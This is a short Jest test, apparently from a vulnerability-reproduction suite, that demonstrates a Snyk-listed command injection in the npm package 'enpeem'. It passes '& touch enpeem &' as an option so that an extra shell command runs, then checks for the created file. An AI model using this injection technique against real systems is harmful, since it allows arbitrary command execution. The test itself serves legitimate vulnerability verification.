//https://snyk.io/vuln/SNYK-JS-ENPEEM-559007
test("Command Injection in enpeem", () => 
{
	const root = require("enpeem");
	const fs = require('fs');
	const path = './enpeem';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	var attack_code = "& touch enpeem &";
	var opts = {
	  "production": attack_code
	}
	async function caller(){
		root.update(opts, function(){});

		sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
	};

	caller();
	

	
});